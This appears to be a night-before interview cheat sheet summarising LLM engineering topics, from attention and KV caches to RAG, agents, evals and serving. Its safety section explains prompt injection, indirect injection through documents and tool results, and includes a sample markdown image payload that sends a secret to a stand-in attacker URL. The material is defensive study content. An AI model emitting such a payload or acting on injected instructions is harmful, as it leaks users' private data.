# The night-before cheat sheet

Read this in one 60-90 minute pass the evening before an interview. It is not a substitute for the full topic material, it is what to have loaded in working memory. Each section links back to its deep dive.

If a term below is unfamiliar, look it up in the [glossary](GLOSSARY.md) instead of stopping to read the whole topic. It defines every acronym and concept in this repo in one line each, with a link to the page that treats it properly.

---

## 🧠 ML & Deep Learning Foundations

- Bias-variance: high bias underfits (add capacity, features), high variance overfits (weight decay, dropout, more data, simpler model).
- Cross-entropy is the right classification loss because it's the maximum-likelihood objective for a categorical distribution, and its gradient with respect to the logits (through softmax) is `p - y`, clean and well-scaled.
- AdamW, not Adam: decouples weight decay from the adaptive gradient update, so decay is not rescaled per parameter. Pair it with warmup and a cosine or warmup-stable-decay schedule.
- LayerNorm normalises across the feature dimension per token, so it works with variable sequence lengths and small batches, unlike BatchNorm. Modern LLMs use pre-norm RMSNorm (no mean-centring, no bias): cheaper, equally stable.
- Precision/recall trade off; accuracy lies on imbalanced data. ROC-AUC can look fine while PR-AUC exposes a weak positive class.
- Cosine similarity, not Euclidean distance, is standard for embeddings, since it ignores magnitude and compares direction. On unit-normalised vectors cosine, dot product and L2 distance give the same ranking, so most stores normalise once and use dot product.
- Data leakage is the silent killer of eval numbers: check for it before trusting any surprising result.
→ Deep dive: [01-ml-and-dl-foundations](01-ml-and-dl-foundations/)

## 🧠 LLM & Transformer Fundamentals

- Attention: `softmax(QKᵀ/√d_k)V`. With unit-variance q and k components, `q·k` has variance `d_k`, so dividing by `√d_k` brings logit variance back to ~1, preventing softmax saturation and vanishing gradients.
- GQA (grouped-query attention) is the common default: groups of query heads share a KV head, cutting the KV cache by `n_heads / n_kv_heads` (64 → 8 is 8×) at near-MHA quality. MLA (DeepSeek) goes further by caching one compressed latent per token and up-projecting it at attention time.
- KV cache size per token = `2 × n_layers × n_kv_heads × head_dim × bytes_per_elem` (the 2 is K and V); multiply by sequence length and concurrent sequences for the total. Long-context decode is a memory capacity and bandwidth problem; long-context prefill is still quadratic attention compute.
- RoPE encodes relative position by rotating Q/K vectors by position-dependent angles. It does not extrapolate far past the training length on its own: long-context models extend it with frequency scaling (position interpolation, NTK-aware, YaRN) plus some long-context training.
- Tokenization (BPE) explains the classic failures: character counting, arithmetic, multilingual token inefficiency.
- Chinchilla: compute-optimal training scales parameters and tokens equally with compute (each roughly `∝ √C`), about 20 tokens per parameter, with training FLOPs `C ≈ 6ND`. Production models train far past that point because inference cost, not training cost, dominates total cost of ownership.
- MoE: total params vs. active params per token. A large total parameter count with a small active count buys capacity at the per-token compute of a much smaller model, at the cost of routing and load-balancing complexity and a memory footprint sized by total params.
- Hybrid SSM models (Jamba, Nemotron-H, Qwen3-Next, Kimi Linear) keep a minority of full-attention layers (a quarter or fewer) for exact recall and make the rest Mamba or linear attention with a fixed-size state. Memory grows with context only in the attention layers. Pure SSMs lose on exact recall and copying because a fixed state cannot losslessly hold an arbitrary prefix.
- Reasoning models spend extra test-time compute (longer chains of thought, RL-trained) for higher accuracy on hard problems, at higher latency and cost. Use them selectively and cap the spend with the provider's effort setting (effort levels have largely replaced thinking-token budgets on current frontier APIs, and some flagships have no thinking-off option).
→ Deep dive: [02-llm-fundamentals](02-llm-fundamentals/)

## 🧭 Prompt Engineering & Context Engineering

- Chain-of-thought helps on multi-step reasoning; it's wasted latency on simple lookups, and reasoning models already do it internally.
- Structured output via constrained decoding: the schema is compiled to a grammar (FSM for regex-like constraints, pushdown automaton for nesting), and at every step tokens that cannot continue a valid parse get their logits set to `-inf`. Output parses by construction. It guarantees syntax, not semantics, so keep value validation, and a tight schema can hurt reasoning: put a free-text reasoning field before the answer fields. JSON mode only promises valid JSON, not your schema.
- Prompt caching rewards a stable prefix: put fixed instructions and tool definitions first, volatile content (user input, retrieved docs) last. Matching is exact-prefix, so one changed token near the top (a timestamp, a reordered tool list) invalidates everything after it. Cache reads are typically about 90% cheaper than fresh input on current models, up to 95-97.5% on some of the newest, but writes can cost 1.25-2.5x input depending on provider and TTL, and caches expire after minutes by default, so a prefix that is rarely reused may never pay back.
- "Lost in the middle": put critical instructions at both the start and the end of a long context, not buried in the middle.
- Context engineering is the 2025+ reframing of prompting: you're managing the whole window, tools, retrieved docs, memory, history, not just a string.
- Context rot: quality degrades as the window fills, well before the advertised limit. Long-running agents need compaction (summarise old turns, clear stale tool results, keep notes outside the window) rather than a bigger window.
→ Deep dive: [03-prompt-engineering-and-context](03-prompt-engineering-and-context/)

## 🔎 RAG & Retrieval

- Decision framework: RAG for fresh or private knowledge, fine-tuning for behaviour/format/style, long-context when the corpus is small and static enough to just stuff in (and its prefix can be cached).
- Hybrid search (BM25 + dense, fused with reciprocal rank fusion) beats pure semantic search when queries include IDs, jargon, or exact terms. RRF: `score(d) = Σ 1/(k + rank_i(d))` with `k ≈ 60`. It fuses by rank because BM25 and cosine scores live on incomparable scales.
- Rerank with a cross-encoder after a wide initial retrieval, a typical pattern is retrieve top-50, rerank down to top-5.
- Metadata filtering has to happen inside the ANN search (pre-filter or filter-aware traversal), not after it: a post-filter on top-k results can filter away everything relevant, and very selective filters may need a brute-force fallback.
- Contextual retrieval (prepending a short LLM-written description of where the chunk sits in its document before embedding and BM25 indexing) meaningfully improves retrieval on chunked documents.
- Shrink the index before buying hardware: Matryoshka embeddings truncate to a shorter prefix of dimensions, and int8 (4×) or binary (32×) quantization with a full-precision rescoring pass cuts vector memory at a small recall cost.
- For PDFs heavy with tables, charts and scans, visual retrievers (ColPali-style late interaction over page images) can skip the parsing pipeline entirely, at a higher storage and query cost.
- When debugging a bad RAG answer, triage first: is this a retrieval miss (wrong chunks returned) or a generation miss (right chunks, model didn't use them)? The fix is different for each.
- Authorisation must be enforced at the retrieval layer with metadata filters, never left to the model to "decide" what a user shouldn't see.
→ Deep dive: [04-rag-and-retrieval](04-rag-and-retrieval/)

## 🎛️ Fine-tuning, RLHF & Alignment

- Escalation path: prompting → RAG → fine-tuning. Don't fine-tune to inject facts, that's RAG's job; fine-tune for consistent style, structured output, or latency/cost wins.
- LoRA: `W' = W + (α/r)BA`, with `B` initialised to zero so training starts exactly at the base model. Rank `r` typically 8-64, `r(d_in + d_out)` params per adapted matrix, roughly 0.1-1% of the base model. Merge `BA` into `W` for zero serving overhead, or keep adapters separate to serve many fine-tunes on one base.
- QLoRA: 4-bit NF4 base quantization + double quantization + paged optimizers. The paper fine-tuned a 65B model on a single 48 GB GPU while roughly matching 16-bit fine-tuning quality on its benchmarks. Gradients flow through the frozen 4-bit base into bf16 adapters.
- Full fine-tuning with Adam in mixed precision costs roughly 16 bytes/param (2 bf16 weights + 2 grads + 4 fp32 master weights + 8 fp32 Adam states), a 7B model needs roughly 112 GB before activations.
- DPO's insight: skip the separate reward model and the RL loop, optimise directly on preference pairs using an implicit reward derived from the policy itself.
- GRPO drops PPO's value model: sample a group of responses per prompt and use each response's reward normalised against the group's mean (and standard deviation) as its advantage. It and other RL-for-reasoning methods work well on math and code specifically because those domains have cheap, verifiable rewards (does the test pass, is the answer correct). Watch for reward hacking against the verifier.
- Catastrophic forgetting: mitigate with lower learning rate, fewer epochs, LoRA over full fine-tuning, and mixing general instruction data back into the task-specific set.
→ Deep dive: [05-fine-tuning-and-alignment](05-fine-tuning-and-alignment/)

## 🤖 Agents, Tool Use & MCP

- An agent is the LLM directing its own loop (deciding what to do next); a workflow is a fixed sequence with the LLM as one step. Don't build an agent when a workflow suffices.
- MCP turns N×M integration sprawl into N+M: one protocol between any host and any tool server. Host runs one client per server, JSON-RPC 2.0 over stdio (local) or Streamable HTTP (remote, OAuth). Server primitives form a control hierarchy: tools are model-controlled, resources app-controlled, prompts user-controlled. It sits below function calling, not instead of it, and has been governed by the Linux Foundation's Agentic AI Foundation since December 2025.
- A2A versus MCP: MCP is vertical (your agent to tools and data you control, a typed call and result). A2A is horizontal (your agent to an opaque peer agent, often another company's): Agent Card discovery, a task lifecycle with input-required and auth-required states, streaming or push updates. They compose, and a peer's output is untrusted content.
- Agent Skills: a folder with a `SKILL.md` (name, description, instructions) plus optional scripts and references, now an open format across major agent clients and, since October 2026, a project of the Agentic AI Foundation alongside MCP. Loaded by progressive disclosure: only name and description sit in context until a task matches. Diagnostic: couldn't reach the system, add a tool; reached it and did it wrong, add a skill; didn't know a fact, add retrieval.
- Design tools the way you'd design a good API: few, well-named, with error messages the model can actually act on. Token-expensive tool outputs are a real cost. With dozens of MCP servers, tool schemas alone can eat tens of thousands of tokens: load tools on demand (tool search) or expose them as a code API the agent scripts against.
- The lethal trifecta: private data access + exposure to untrusted content + an exfiltration channel. Remove any one leg and the agent stops being exploitable by design, not by hoping the model refuses.
- Reliability compounds multiplicatively across steps: 0.95 per-step success over 20 steps is roughly 0.36 end to end. This is why long-horizon agents need checkpointing and self-correction, not just a good single-step model.
- Multi-agent architectures help for parallel, read-heavy work (research, search); they hurt for write-heavy, shared-state work where coordination overhead dominates.
- Irreversible actions need a human approval gate. Model confidence is not authorisation.
→ Deep dive: [06-agents-and-tool-use](06-agents-and-tool-use/)

## 🧪 Evals & Observability

- Evals are the engineering artifact that makes iteration safe. Treat eval-set changes with the same rigour as code changes: version them, run them in CI, gate deploys on them.
- LLM-as-judge: pairwise comparison is usually more reliable than pointwise scoring for A/B decisions. For absolute monitoring, prefer binary pass/fail per criterion over 1-10 scales, and calibrate the judge against human labels before trusting it. Known biases: position bias (swap order and average), verbosity bias, self-preference (use a different model family as judge when possible).
- pass@k unbiased estimator (Chen et al., Codex paper): generate `n ≥ k` samples, count `c` correct, `pass@k = 1 - C(n-c, k) / C(n, k)`. Naively sampling exactly k is high-variance.
- pass^k (all k trials succeed, popularised by τ-bench, estimated as `C(c, k) / C(n, k)`) punishes inconsistency that pass@k hides, closer to what matters for agent reliability.
- Small evals are noisy: standard error is `√(p(1-p)/n)`, so at 75% on 100 examples one SE is ~4.3 points and 78% vs 74% is not a result. Use paired comparisons on the same items, bootstrap confidence intervals, and repeated runs for stochastic agents.
- Public benchmarks saturate and leak into training data. Treat leaderboard position as a weak, contaminated signal, not ground truth for your use case.
- RAG evals split cleanly: retrieval metrics (recall@k, MRR, nDCG) vs. generation metrics (faithfulness, answer relevance). Measure both separately to triage failures.
- Start an eval set with 20-50 genuinely hard, real examples sourced from production failures, not hundreds of easy synthetic ones.
→ Deep dive: [07-evaluation-and-observability](07-evaluation-and-observability/)

## ⚡ Inference, Serving & Production LLM Systems

- Prefill is compute-bound (parallel over the prompt); decode is memory-bandwidth-bound (sequential, one token at a time). This asymmetry drives almost every serving decision.
- TTFT (time to first token) is dominated by queueing and prefill; TPOT/ITL (time per output token) is dominated by memory bandwidth and batch contention. Total latency ≈ TTFT + TPOT × (output_tokens - 1).
- Batch-1 decode speed is capped by bandwidth: every step reads all active weights plus the KV cache, so tokens/sec ≤ HBM bandwidth / bytes read per step. Batching amortises the weight read, which is why throughput rises with batch until compute or KV memory runs out.
- PagedAttention (vLLM) manages the KV cache like virtual memory in fixed-size blocks, cutting fragmentation waste to the last partial block per sequence, enabling much higher batch sizes and block-level prefix sharing.
- Continuous batching lets requests join and leave a batch per decode step instead of waiting for the whole batch to finish, the single biggest throughput win in modern serving. Chunked prefill splits long prompts so they don't stall everyone else's decode.
- Prefill/decode disaggregation runs the two phases on separate GPU pools and ships the KV cache between them, so each pool can be sized, batched and parallelised for its own bottleneck. Worth it at scale, overhead at small scale.
- Speculative decoding: a cheap drafter (small model, EAGLE-style heads, built-in MTP modules, or n-gram lookup from the prompt) proposes γ tokens, the target verifies them in one pass. Accept each with probability `min(1, p_target/p_draft)` and resample from the residual on rejection, so the output distribution is exactly the target's. Expected tokens per target pass `(1 - α^(γ+1)) / (1 - α)` for acceptance rate α (assuming independent acceptances). Wall-clock speedup divides that by `(γc + 1)`, where c is the drafter's cost per token relative to the target, so a slow drafter erases the gain. Parallel drafters (block-diffusion drafters such as DFlash, DeepSeek's DSpark) produce the whole block in one pass, so the denominator is about `(c_block + 1)` and nearly independent of γ; the limit becomes acceptance falling off along the block, which DSpark offsets with a small sequential module and a per-request verification length. Big wins at low batch on predictable text (code, extraction), shrinking or negative at high batch where verification steals compute.
- Semantic caching returns a stored answer when a new query embeds close to an old one. Unlike prefix caching (exact match, reuses computation, lossless) it skips the model entirely and is lossy: tune the threshold on real traffic, scope entries per tenant and per permission set, and never cache personalised or time-sensitive answers.
- Hybrid SSM serving: attention layers keep per-token KV blocks while Mamba or linear layers hold a fixed-size state updated in place, so engines need a heterogeneous cache allocator. That state cannot be sliced or rolled back like KV blocks, so prefix caching, branching, speculative decoding and disaggregation all get harder. Engines work around it by snapshotting state at chunk boundaries, which costs extra memory.
- MoE serving: memory is sized by total params, per-token compute by active params. At scale you shard experts across GPUs (expert parallelism) and pay for all-to-all routing traffic and load imbalance.
- KV cache quantization (FP8 KV) halves cache memory versus BF16, roughly doubling the concurrent sequences or context that fit, usually at negligible quality cost. NVFP4 KV cache, now in production engines such as vLLM and TensorRT-LLM, halves it again versus FP8; values are dequantized before attention, so the saving is memory and bandwidth, not compute. FP4 weights (NVFP4, MXFP4) on Blackwell-class GPUs halve weight memory again versus FP8, but validate quality per model.
- Report goodput (throughput within your latency SLO), not raw throughput. 10K tokens/sec at 30-second TTFT is worthless for a chat product.
- Prompt caching and batch APIs (typically 50% off, results within 24 hours) are the two biggest cost levers available with zero quality tradeoff, use them before reaching for a smaller model.
→ Deep dive: [08-inference-and-production](08-inference-and-production/)

## 🛡️ Safety, Security & Responsible AI

- Prompt injection is unsolved because the context window has no privilege separation between instructions and data. Defend with defence in depth, not a single filter: input/output classifiers, least-privilege tools, human approval for irreversible actions, and treating every model output as untrusted.
- Indirect injection (via a retrieved document, email, or tool result) is more dangerous than direct injection because the victim never sees the attack.
- Jailbreaks attack the model's trained behaviour; prompt injection attacks the application. Different attacker, different fix, different owner.
- Assume the system prompt leaks. Never put secrets or unenforced authorisation logic in it.
- Rendered markdown is an exfiltration channel: an injected `![](https://attacker/?q=secret)` leaks data the moment the client fetches the image. Allowlist image and link domains or strip URLs from output.
- Safetensors over pickle for model weights, pickle deserialization can execute arbitrary code on load. Third-party MCP servers and skills are supply-chain dependencies too: pin versions, review diffs, sandbox bundled scripts, and watch for poisoned tool descriptions and rug pulls.
- EU AI Act: prohibitions applied from February 2025 and general-purpose model obligations from August 2025. Article 50 transparency rules have applied since 2 August 2026, and Commission enforcement of the GPAI obligations, including fines, began the same day. The AI Omnibus (Regulation (EU) 2026/1744, in force 27 July 2026) moves stand-alone high-risk obligations (Annex III: hiring, credit scoring, education) to 2 December 2027 and product-embedded ones (Annex I) to 2 August 2028, and bans AI systems that generate non-consensual intimate imagery or CSAM from 2 December 2026.
- OWASP Top 10 for LLM Applications (2026 edition, published August 2026) is the shared vocabulary interviewers expect: prioritise the categories that matter for the system in front of you, don't just recite the list. The 2026 list moved Excessive Agency up to LLM03, dropped Improper Output Handling to LLM10 and replaced System Prompt Leakage with Hidden Context Exposure (LLM08). For agents, the chain is LLM01 injection → LLM10 improper output handling → LLM03 excessive agency, and OWASP's separate Top 10 for Agentic Applications (December 2025) covers goal hijack, tool misuse, memory poisoning and inter-agent trust.
→ Deep dive: [09-safety-security-and-responsible-ai](09-safety-security-and-responsible-ai/)

## 🖼️ Multimodal Models

- Vision-language models tokenize images into patches via a vision encoder (ViT-style), project them into the LLM's embedding space, then process them as ordinary tokens, more tokens per image, more cost.
- CLIP's contrastive image-text pretraining is why zero-shot classification and cross-modal retrieval work at all: it aligns image and text embeddings in a shared space.
- Diffusion models generate by iterative denoising; latent diffusion does this in a VAE-compressed latent space rather than pixel space, which is why it's tractable. Current image and video models (SD3, Flux class) use a transformer denoiser (DiT) trained with flow matching / rectified flow, giving straighter trajectories and fewer sampling steps. The VAE caps fine detail such as small text and faces.
- General VLMs still slip on precise counting, fine spatial reasoning, and exact transcription of dense tables and long digit strings (they hallucinate plausible characters). When you need exact text and bounding boxes, use a dedicated OCR or document-parsing model, classic or a small OCR-specialised VLM, and keep the general model for reasoning over its output.
- Native speech-to-speech models beat the STT→LLM→TTS pipeline on latency and naturalness, but the pipeline is easier to control, debug, and swap components in.
→ Deep dive: [10-multimodal](10-multimodal/)

## 🏗️ AI System Design

- The model is a component, not the whole system. Spend your time on data/context strategy, evaluation, and failure modes, not on redesigning the transformer.
- Always state success metrics and a rough cost-per-request estimate out loud, interviewers grade for cost and eval awareness as much as architecture.
- Have a fallback and a degradation path for every external model call: retries, timeouts, a cheaper model, or a static response, never a bare unhandled failure.
- Put an LLM gateway in front of every provider and self-hosted model: one place for auth, per-tenant quotas and cost attribution, routing and fallbacks, caching, redaction and logging. Trace each request as spans (model call, retrieval, tool call) with model version, tokens, cost and latency, using the OpenTelemetry GenAI semantic conventions so traces stay portable.
- Do the capacity maths out loud: requests/sec × (input + output tokens) gives prefill and decode load, which gives GPUs or dollars per day. Then name the levers: model cascade or routing, prompt caching, batch for anything offline.
→ Deep dive: [11-ai-system-design](11-ai-system-design/)

## 🧑‍💻 Coding Challenges

- Implement attention, sampling, and the KV cache loop by hand at least once. The interview is a blank editor, not a multiple-choice quiz. Beyond those, practise BPE training, hybrid search plus rerank, a semantic cache, constrained JSON decoding and a speculative decoding verifier: each has a runnable version in the challenges folder.
- Numerical stability matters: subtract the max before softmax, use log-space where you can, these are the details that separate a working solution from a correct-looking one that overflows on real inputs.
→ Deep dive: [12-coding-challenges](12-coding-challenges/)

---

## 🔢 Numbers and formulas to know cold

| Concept | Formula / value |
|---|---|
| Attention | `softmax(QKᵀ/√d_k)V`, scaling keeps logit variance ≈ 1 |
| KV cache size per token | `2 × n_layers × n_kv_heads × head_dim × bytes_per_elem` |
| KV cache worked example | Llama-3-70B shape (80 layers, 8 KV heads, head_dim 128, BF16): ≈ 320 KB/token, ≈ 40 GB for one 128K-token sequence |
| GQA saving | KV cache shrinks by `n_heads / n_kv_heads` vs MHA (64 query heads, 8 KV heads = 8×) |
| Weight memory (inference) | params × bytes: BF16 2, FP8/INT8 1, FP4/INT4 ~0.5-0.6 with scales. 70B in BF16 ≈ 140 GB, before KV cache |
| Training compute | `C ≈ 6ND` FLOPs (N params, D tokens). Chinchilla-optimal ≈ 20 tokens per param |
| LoRA update | `W' = W + (α/r)BA`, typical rank `r` = 8-64, `r(d_in + d_out)` params per adapted matrix |
| Full fine-tuning memory (Adam, mixed precision) | ≈ 16 bytes/param (2 weights + 2 grads + 4 fp32 master + 8 Adam states), so 7B ≈ 112 GB before activations |
| pass@k (unbiased estimator) | `1 - C(n-c, k) / C(n, k)` for `n` samples, `c` correct |
| pass^k (estimator) | `C(c, k) / C(n, k)`: probability all k sampled trials succeed |
| Eval noise | Standard error `√(p(1-p)/n)`: 75% on 100 items ≈ ±4.3 points (1 SE) |
| RRF | `score(d) = Σ 1/(k + rank_i(d))`, `k ≈ 60` |
| TTFT | Time to first token: queueing + prefill |
| TPOT / ITL | Time per output token after the first: memory-bandwidth-bound |
| Total latency | `TTFT + TPOT × (output_tokens - 1)` |
| Decode ceiling at batch 1 | tokens/sec ≤ HBM bandwidth / bytes read per step. 8B BF16 (16 GB) on a 3.35 TB/s H100 ≈ 200 tok/s at best, ~500 on an ~8 TB/s B200 |
| Speculative decoding | Expected tokens per target pass `(1 - α^(γ+1)) / (1 - α)`. α = 0.8, γ = 4 gives ≈ 3.4. Speedup ≈ that / `(γc + 1)`, c = draft cost relative to target (≈ that / `(c_block + 1)` for parallel drafters) |
| Rerank pattern | Retrieve top-50 (cheap, wide) → rerank to top-5 (expensive, precise) |
| Agent reliability | `p^n` compounding: 0.95 per step over 20 steps ≈ 0.36 end to end |
| Cost levers | Cached input typically 90-95% off on current OpenAI, Anthropic and Google models (97.5% on Claude Fable 5.1, 75% on Grok 4.7); cache writes cost 1.25x input on OpenAI GPT-5.6+ and Anthropic; batch APIs typically 50% off |

## ❓ 25 questions you're most likely to be asked

1. Explain self-attention and why we divide by √d_k. → [02-llm-fundamentals](02-llm-fundamentals/questions.md)
2. What's the difference between MQA, GQA, and MHA, and why does it matter for serving? → [02-llm-fundamentals](02-llm-fundamentals/questions.md)
3. Walk me through how BPE tokenization works, and what problems it causes. → [02-llm-fundamentals](02-llm-fundamentals/questions.md)
4. What is the KV cache, and how do you estimate its memory footprint? → [02-llm-fundamentals](02-llm-fundamentals/questions.md)
5. When would you use RAG versus fine-tuning versus a longer context window? → [04-rag-and-retrieval](04-rag-and-retrieval/questions.md)
6. How do you chunk documents for retrieval, and what determines chunk size? → [04-rag-and-retrieval](04-rag-and-retrieval/questions.md)
7. What's the difference between a bi-encoder and a cross-encoder, and where does reranking fit? → [04-rag-and-retrieval](04-rag-and-retrieval/questions.md)
8. How would you debug a RAG system that's giving wrong answers? → [04-rag-and-retrieval](04-rag-and-retrieval/questions.md)
9. Explain LoRA, and why it reduces memory during fine-tuning. → [05-fine-tuning-and-alignment](05-fine-tuning-and-alignment/questions.md)
10. What's the core idea behind DPO, and how does it differ from PPO-based RLHF? → [05-fine-tuning-and-alignment](05-fine-tuning-and-alignment/questions.md)
11. What's the difference between a workflow and an agent, and when should you not build an agent? → [06-agents-and-tool-use](06-agents-and-tool-use/questions.md)
12. How does MCP work, and what problem does it actually solve? → [06-agents-and-tool-use](06-agents-and-tool-use/questions.md)
13. How would you design the tool permission model for an agent with write access? → [06-agents-and-tool-use](06-agents-and-tool-use/questions.md)
14. What's the lethal trifecta, and how do you design around it? → [09-safety-security-and-responsible-ai](09-safety-security-and-responsible-ai/questions.md)
15. How do you build and maintain an eval set for an LLM feature? → [07-evaluation-and-observability](07-evaluation-and-observability/questions.md)
16. What are the known biases in LLM-as-judge evaluation, and how do you mitigate them? → [07-evaluation-and-observability](07-evaluation-and-observability/questions.md)
17. Derive or explain the unbiased pass@k estimator. → [07-evaluation-and-observability](07-evaluation-and-observability/questions.md)
18. Why is decode memory-bandwidth-bound while prefill is compute-bound? → [08-inference-and-production](08-inference-and-production/questions.md)
19. Explain continuous batching and why it beats static batching. → [08-inference-and-production](08-inference-and-production/questions.md)
20. How does speculative decoding speed up generation without changing output quality? → [08-inference-and-production](08-inference-and-production/questions.md)
21. Is prompt injection solved? How do you defend against it? → [09-safety-security-and-responsible-ai](09-safety-security-and-responsible-ai/questions.md)
22. Walk through the OWASP Top 10 for LLM applications for a system of your choice. → [09-safety-security-and-responsible-ai](09-safety-security-and-responsible-ai/questions.md)
23. Design a RAG assistant over a company's internal wikis and tickets, with access control. → [11-ai-system-design](11-ai-system-design/case-studies/01-enterprise-rag-assistant.md)
24. Design a customer support agent that can take real actions like issuing refunds. → [11-ai-system-design](11-ai-system-design/case-studies/03-customer-support-agent.md)
25. Walk me through an LLM feature you shipped end to end, and how you evaluated it. → [13-interview-process-and-behavioral](13-interview-process-and-behavioral/questions.md)

## 🗣 Phrases that make you sound senior

- "Evals are the moat here, not the prompt." Framing evaluation as the durable engineering artifact, not an afterthought.
- "Is this a retrieval miss or a generation miss?" The first question in any RAG debugging session.
- "What's the failure mode if the provider is down for ten minutes?" Thinking about degradation before being asked.
- "That's a cost decision as much as a technical one." Naming the token-cost tradeoff explicitly instead of treating quality as free.
- "The context window has no privilege separation." The one sentence that explains why prompt injection is architecturally hard, not a prompting bug.
- "Let's remove a leg of the trifecta." Turning an agent security concern into a concrete design change.
- "Prefill is compute-bound, decode is memory-bandwidth-bound." The sentence that tells an interviewer you've actually operated a serving stack.
- "We'd want a golden set before touching the prompt again." Refusing to iterate blind.
- "What's the reversibility of this action?" The question that separates auto-execute from human-approval-gated agent actions.
- "Pass@k versus pass^k, depending on whether best-case or reliability is what we're optimising for." Precision about what a metric actually measures.
- "MCP for our tools, A2A for their agents." Knowing which boundary each protocol is for, and that a peer agent's output is untrusted input.
- "Is that a missing tool, a missing skill, or missing knowledge?" Picking the right fix for an agent failure instead of rewriting the prompt.
